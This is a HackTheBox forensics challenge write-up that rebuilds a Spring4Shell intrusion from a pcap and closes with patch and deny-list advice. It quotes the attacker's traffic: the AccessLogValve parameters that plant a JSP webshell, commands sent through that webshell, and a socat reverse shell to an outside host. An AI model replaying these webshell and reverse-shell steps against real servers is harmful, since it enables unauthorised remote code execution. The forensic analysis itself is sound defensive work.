---
title: "Wrong Spooky Season"
date: 2026-09-29 09:00:00 -0500
categories: [HackTheBox, Challenges, Forensics]
tags: [hackthebox, challenge, forensics, pcap, tshark, spring4shell, cve-2022-22965, webshell]
description: "A Forensics challenge that hands you one HTTP pcap of a real Spring4Shell intrusion. Read the AccessLogValve webshell write, follow the cleartext reverse shell, and undo a rev+base64 decoy to recover the flag."
---

## Overview

`Wrong Spooky Season` is a Very Easy HackTheBox **Forensics** challenge. You get a single
`capture.pcap` of an attack against a Spring web app, and your job is to reconstruct what
happened. The whole intrusion is in plaintext HTTP: a [Spring4Shell (CVE-2022-22965)](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)
arbitrary-file-write drops a JSP webshell, the attacker runs commands through it, opens a
reverse shell, and hides the flag in a `rev`+base64 decoy command.

## The technique

[Spring4Shell](https://cwe.mitre.org/data/definitions/915.html) ([CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965))
abuses Spring's `WebDataBinder`, which binds HTTP request parameters to nested bean properties
with no allow-list. On JDK 9+ an attacker can walk from any controller-bound object up the
graph via `class.module.classLoader.resources.context.parent.pipeline.first.*` and reach
Apache Tomcat's `AccessLogValve`. By setting that valve's `pattern`, `suffix`, `directory`,
and `prefix`, they turn the **access log file itself** into a JSP webshell — an unauthenticated
arbitrary file write that becomes remote code execution.

In a pcap, the unmistakable signature is a POST whose urlencoded body keys start with
`class.module.classLoader.resources.context.parent.pipeline.first`. Everything after that is
just reading the cleartext conversation in order.

## Solution

Start with the protocol breakdown and the HTTP request list:

```bash
tshark -r capture.pcap -q -z io,phs
tshark -r capture.pcap -Y http.request -T fields -e frame.number -e http.request.method -e http.host -e http.request.uri
```

Normal page loads, then three `POST /spookhouse/home/`, then a brand-new
`GET /e4d1c32a56ca15b3.jsp?cmd=whoami` — a JSP that did not exist until the POSTs created it.

Dump the POST bodies to confirm Spring4Shell:

```bash
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e urlencoded-form.key -e urlencoded-form.value
```

The gadget params appear in full — `pattern` carries the webshell source
(`Runtime.getRuntime().exec(request.getParameter("cmd"))`), with `suffix=.jsp`,
`directory=webapps/ROOT`, and `prefix=e4d1c32a56ca15b3`. The attacker then runs commands
through the dropped shell:

```bash
GET /e4d1c32a56ca15b3.jsp?cmd=whoami
GET /e4d1c32a56ca15b3.jsp?cmd=id
GET /e4d1c32a56ca15b3.jsp?cmd=apt%20-y%20install%20socat
GET /e4d1c32a56ca15b3.jsp?cmd=socat%20TCP:192.168.1.180:1337%20EXEC:bash
```

Already `root`, and the last command opens a reverse shell to the attacker on tcp/1337. Find
that stream and read it:

```bash
tshark -r capture.pcap -Y "tcp.port==1337" -T fields -e tcp.stream | sort -u
tshark -r capture.pcap -q -z follow,tcp,ascii,14
```

Among the post-exploitation commands is a fake persistence one-liner with a suspicious clause:

```bash
echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null
```

The `> /dev/null` is the tell — the output is thrown away, so the string is the payload, not a
real command. It was passed through `rev`, and what `rev` produces is base64. Undo both. The
durable artifact, `solve.py`, pulls the token straight from the pcap and decodes it:

```python
import base64, subprocess, re, sys
PCAP = sys.argv[1] if len(sys.argv) > 1 else "files/capture.pcap"
out = subprocess.check_output(["tshark","-r",PCAP,"-q","-z","follow,tcp,ascii,14"], text=True)
token = re.search(r'echo "([A-Za-z0-9+/=]+)" \| rev', out).group(1)
print(base64.b64decode(token[::-1]).decode().strip())   # reverse, then base64
```

```bash
python3 solve.py files/capture.pcap
HTB{...}
```

## Why it worked

Spring4Shell lets HTTP request parameters reach `class.module.classLoader.*` because Spring's
data binding maps nested properties by default. On Tomcat that chain reaches the
`AccessLogValve`, giving an arbitrary file write — a webshell — with no authentication. Because
the traffic was plaintext HTTP, the webshell write, every `cmd=`, and the entire reverse-shell
session are all readable in the capture; the flag was only lightly obfuscated with `rev` and
base64 and tucked into a decoy command.

## Fix / defense

- Upgrade Spring Framework to 5.3.18+ / 5.2.20+ (or Spring Boot 2.6.6+ / 2.5.12+).
- Set an explicit deny-list on every `WebDataBinder`:
  `dataBinder.setDisallowedFields("class.*","Class.*","*.class.*","*.Class.*")`.
- Prefer the embedded-server deployment over a WAR on Tomcat where possible.
- Use TLS so an intrusion isn't trivially reconstructable on the wire, and rely on EDR / egress
  filtering to catch `apt install socat` plus an outbound shell to an odd port.
